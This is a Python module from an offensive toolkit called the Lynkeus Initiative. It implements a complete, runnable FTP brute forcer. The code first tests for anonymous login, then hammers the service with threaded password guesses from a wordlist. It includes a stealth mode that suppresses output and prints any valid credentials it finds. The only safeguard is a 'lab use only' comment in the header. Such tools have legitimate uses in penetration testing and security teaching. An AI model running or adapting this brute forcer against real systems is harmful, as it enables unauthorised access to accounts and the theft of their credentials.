#!/usr/bin/env python3

# ─────────────────────────────────────────────
# modules/credentials/ftp_brute.py
# Lynkeus Initiative — FTP Brute Forcer
# Tests credentials against an FTP service
# Also checks for anonymous login automatically
# Lab use only — run against machines you own
# ─────────────────────────────────────────────

import ftplib
import time
import concurrent.futures

from output.colors import GREEN, RED, YELLOW, CYAN, DIM, BOLD, RESET


def ftp_anon_check(host, port, timeout):
    """
    # Checks if the FTP server allows anonymous login
    # Always runs first before any brute force attempts
    """

    try:
        ftp = ftplib.FTP()
        ftp.connect(host, port, timeout=timeout)
        ftp.login("anonymous", "anonymous@lab.local")

        # ── Anonymous login succeeded ─────────────────────────────
        ftp.quit()
        return True

    except ftplib.error_perm:
        # ── Anonymous login rejected ──────────────────────────────
        return False

    except Exception:
        return False


def ftp_connect(host, port, username, password, timeout):
    """
    # Attempts a single FTP login with the given credentials
    # Returns True on success, False on failure, None on error
    """

    try:
        ftp = ftplib.FTP()
        ftp.connect(host, port, timeout=timeout)
        ftp.login(username, password)

        # ── Login succeeded ───────────────────────────────────────
        ftp.quit()
        return True

    except ftplib.error_perm:
        # ── Wrong credentials ─────────────────────────────────────
        return False

    except Exception:
        # ── Connection or protocol error ──────────────────────────
        return None


def run_ftp_brute(host, port, usernames, wordlist_path, threads, delay, timeout, stealth):
    """
    # Main FTP brute force loop
    # Checks anonymous access first, then runs credential wordlist
    """

    # ── Load password wordlist ────────────────────────────────────
    try:
        with open(wordlist_path, "r", errors="ignore") as f:
            passwords = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print ("[!] Wordlist not found: " + wordlist_path)
        return

    print ("")
    print (CYAN + "=" * 55 + RESET)
    print (BOLD + "  FTP BRUTE FORCER" + RESET)
    print (CYAN + "=" * 55 + RESET)
    print ("  Target    : " + BOLD + host + ":" + str(port) + RESET)
    print ("  Usernames : " + str(len(usernames)))
    print ("  Passwords : " + str(len(passwords)))
    print ("  Stealth   : " + (GREEN + "ON" if stealth else DIM + "OFF") + RESET)
    print (CYAN + "-" * 55 + RESET)
    print ("")

    found = []

    # ── Always check anonymous login first ───────────────────────
    print (YELLOW + "[*] Checking anonymous login..." + RESET)

    if ftp_anon_check(host, port, timeout):
        print (GREEN + BOLD + "  [+] ANONYMOUS LOGIN ACCEPTED" + RESET)
        found.append({"username": "anonymous", "password": "anonymous"})
    else:
        print (DIM + "  [-] Anonymous login rejected" + RESET)

    print ("")

    # ── Run credential brute force ────────────────────────────────
    for username in usernames:

        print (YELLOW + "[*] Testing username: " + username + RESET)

        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:

            futures = {
                executor.submit(ftp_connect, host, port, username, password, timeout): password
                for password in passwords
            }

            for future in concurrent.futures.as_completed(futures):
                password = futures[future]
                result   = future.result()

                if result is True:
                    print ("")
                    print (GREEN + BOLD + "  [+] VALID CREDENTIALS FOUND" + RESET)
                    print (GREEN + "      Username : " + username + RESET)
                    print (GREEN + "      Password : " + password + RESET)
                    print ("")
                    found.append({"username": username, "password": password})

                    for f in futures:
                        f.cancel()
                    break

                elif result is None:
                    if not stealth:
                        print (DIM + "  [~] Error on " + username + ":" + password + RESET)

                else:
                    if not stealth:
                        print (RED + "  [-] " + username + ":" + password + RESET)

                if delay > 0:
                    time.sleep(delay)

    # ── Summary ───────────────────────────────────────────────────
    print (CYAN + "-" * 55 + RESET)

    if found:
        print (GREEN + BOLD + "  [+] " + str(len(found)) + " valid credential(s) found." + RESET)
        for cred in found:
            print (GREEN + "      " + cred["username"] + " : " + cred["password"] + RESET)
    else:
        print (RED + "  [-] No valid credentials found." + RESET)

    print (CYAN + "=" * 55 + RESET)
    print ("")

    return found
